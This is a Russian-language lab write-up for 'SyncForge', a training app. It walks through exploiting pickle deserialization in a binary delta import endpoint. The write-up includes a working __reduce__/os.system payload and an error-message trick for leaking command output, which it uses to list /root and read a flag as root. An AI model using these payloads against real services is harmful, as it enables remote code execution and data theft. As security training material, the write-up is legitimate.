# Lab 416 - SyncForge - Insecure Deserialization via Pickle Import

Приложение: SyncForge, сервис для синхронизации конфигураций между окружениями.

Суть: импорт бинарных Delta-файлов десериализует данные через pickle. Через специально подготовленный файл можно выполнить команду на сервере, а её вывод получить в сообщении об ошибке.

## Как нашёл

В разделе Config Sync нашёл Import Delta. Вкладка Binary Delta принимала бинарный файл, а в описании прямо было сказано, что файл сериализован с помощью pickle. При загрузке он отправлялся на эндпоинт:

```http
POST /api/sync/import-delta?target_id=2
Content-Type: application/octet-stream
```

Решил проверить, можно ли выполнить команду во время десериализации. Для этого подготовил файл:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/syncforge_poc",))

with open("payload.bin", "wb") as f:
    pickle.dump(Exploit(), f, protocol=4)
```

При восстановлении объекта pickle вызывает функцию, которую вернул `__reduce__`. Здесь это `os.system` с командой `id`. Вывод команды я направил в файл на сервере.

## Первая попытка

Сначала создал payload на Windows и загрузил его через Binary Delta. Сервер ответил ошибкой:

```text
Failed to apply delta: No module named 'nt'
```

<img width="1915" height="906" alt="image" src="https://github.com/user-attachments/assets/894ec8f5-e879-40e6-a630-19bb3925d74e" />


Проблема оказалась в том, что pickle сохранил ссылку на `nt.system` — реализацию `os.system` в Windows. Сервер работал на Linux, где модуля `nt` нет. Создал файл заново на Linux и загрузил ещё раз.

<img width="1280" height="672" alt="image" src="https://github.com/user-attachments/assets/df8acb7a-275b-4960-b18f-3d6cbfc25eed" />


На этот раз интерфейс показал `Delta applied successfully`. Но вывод `id` в ответе не появился: в первом payload он записывался в `/tmp/syncforge_poc`. Я поискал эндпоинт, через который можно было бы прочитать файл, но ничего подходящего не нашёл. Сам по себе ответ об успешном импорте ещё не показывал результат команды.

## Вывод через ошибку

Попробовал другой подход: выполнить команду, получить её вывод и передать его в `int()`. Вывод `id` не является числом, поэтому преобразование вызывает ошибку, в текст которой попадает сама строка.

Выражение из payload:

```python
int(__import__('subprocess').check_output(['id'], text=True).strip())
```

Загрузил файл и посмотрел ответ в Burp. Сервер вернул HTTP 400, а внутри ошибки оказался вывод `id`:

```text
invalid literal for int() with base 10: 'uid=0(root) gid=0(root) ...'
```

<img width="1664" height="621" alt="image" src="https://github.com/user-attachments/assets/07890495-a595-48bc-a3f9-2585ff145c35" />


Команда выполнилась от `root`. Теперь можно было читать результат команд прямо в ответе, без поиска отдельного эндпоинта для файла.

## Поиск флага

Тем же способом посмотрел содержимое `/root`. В payload использовал выражение:

```python
int(__import__('subprocess').getoutput('ls -la /root 2>&1 | head -8'))
```

В сообщении об ошибке пришёл список файлов. Среди них был `flag.txt`:

<img width="1645" height="594" alt="image" src="https://github.com/user-attachments/assets/cab283ac-b5bc-4372-9b32-c235fe30636c" />


Дальше тем же способом прочитал `/root/flag.txt` и получил флаг.

```text
[флаг]
```
